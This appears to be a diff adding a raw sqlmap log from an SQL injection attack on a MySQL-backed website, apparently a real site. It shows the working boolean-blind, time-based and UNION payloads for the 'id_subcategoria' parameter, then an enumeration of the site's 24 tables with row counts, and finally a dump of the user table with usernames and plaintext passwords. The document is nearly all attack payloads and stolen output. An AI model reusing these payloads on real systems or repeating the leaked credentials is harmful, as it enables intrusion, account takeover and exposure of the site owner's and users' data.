@@ -1,0 +1,181 @@
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: id_subcategoria (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id_subcategoria=(SELECT (CASE WHEN (4429=4429) THEN 100 ELSE (SELECT 8713 UNION SELECT 8803) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_subcategoria=100 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_subcategoria=-9950 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6a71,0x797a6b76776f62494d714d74667747624f4f785555504d77516b57547a615968707277447257764a,0x7171626a71),NULL,NULL,NULL-- GtyS
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] deboranovaesde
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_subcategoria (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id_subcategoria=(SELECT (CASE WHEN (4429=4429) THEN 100 ELSE (SELECT 8713 UNION SELECT 8803) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_subcategoria=100 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_subcategoria=-9950 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6a71,0x797a6b76776f62494d714d74667747624f4f785555504d77516b57547a615968707277447257764a,0x7171626a71),NULL,NULL,NULL-- GtyS
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: deboranovaesde
+[24 tables]
++-----------------------+
+| tb_autor              |
+| tb_categoria          |
+| tb_cliente            |
+| tb_comentario         |
+| tb_comentario_galeria |
+| tb_comentario_noticia |
+| tb_contato            |
+| tb_conteudo           |
+| tb_foto               |
+| tb_galeria            |
+| tb_grupo              |
+| tb_homenagem          |
+| tb_link               |
+| tb_livro              |
+| tb_noticia            |
+| tb_resposta           |
+| tb_resposta_galeria   |
+| tb_resposta_noticia   |
+| tb_resposta_visitas   |
+| tb_saibamais          |
+| tb_subcategoria       |
+| tb_upload             |
+| tb_usuario            |
+| tb_visitas            |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_subcategoria (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id_subcategoria=(SELECT (CASE WHEN (4429=4429) THEN 100 ELSE (SELECT 8713 UNION SELECT 8803) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_subcategoria=100 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_subcategoria=-9950 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6a71,0x797a6b76776f62494d714d74667747624f4f785555504d77516b57547a615968707277447257764a,0x7171626a71),NULL,NULL,NULL-- GtyS
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: deboranovaesde
+[24 tables]
++-----------------------+
+| tb_autor              |
+| tb_categoria          |
+| tb_cliente            |
+| tb_comentario         |
+| tb_comentario_galeria |
+| tb_comentario_noticia |
+| tb_contato            |
+| tb_conteudo           |
+| tb_foto               |
+| tb_galeria            |
+| tb_grupo              |
+| tb_homenagem          |
+| tb_link               |
+| tb_livro              |
+| tb_noticia            |
+| tb_resposta           |
+| tb_resposta_galeria   |
+| tb_resposta_noticia   |
+| tb_resposta_visitas   |
+| tb_saibamais          |
+| tb_subcategoria       |
+| tb_upload             |
+| tb_usuario            |
+| tb_visitas            |
++-----------------------+
+
+Database: deboranovaesde
++-----------------------+---------+
+| Table                 | Entries |
++-----------------------+---------+
+| tb_cliente            | 2024    |
+| tb_visitas            | 160     |
+| tb_conteudo           | 140     |
+| tb_galeria            | 68      |
+| tb_grupo              | 65      |
+| tb_subcategoria       | 53      |
+| tb_contato            | 38      |
+| tb_resposta_visitas   | 35      |
+| tb_livro              | 27      |
+| tb_foto               | 22      |
+| tb_noticia            | 16      |
+| tb_comentario_galeria | 10      |
+| tb_comentario         | 9       |
+| tb_comentario_noticia | 8       |
+| tb_resposta_galeria   | 7       |
+| tb_categoria          | 6       |
+| tb_link               | 4       |
+| tb_resposta           | 4       |
+| tb_autor              | 3       |
+| tb_upload             | 3       |
+| tb_usuario            | 2       |
+| tb_homenagem          | 1       |
+| tb_resposta_noticia   | 1       |
++-----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_subcategoria (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id_subcategoria=(SELECT (CASE WHEN (4429=4429) THEN 100 ELSE (SELECT 8713 UNION SELECT 8803) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_subcategoria=100 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_subcategoria=-9950 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6a71,0x797a6b76776f62494d714d74667747624f4f785555504d77516b57547a615968707277447257764a,0x7171626a71),NULL,NULL,NULL-- GtyS
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: deboranovaesde
+Table: tb_usuario
+[2 entries]
++------------+---------+----------+----------+----------+
+| id_usuario | de_nome | de_login | de_senha | tp_nivel |
++------------+---------+----------+----------+----------+
+| 2          | Metatag | metatag  | m3t4t4g  | 0        |
+| 1          | Débora  | debora35 | 415263   | 0        |
++------------+---------+----------+----------+----------+
+
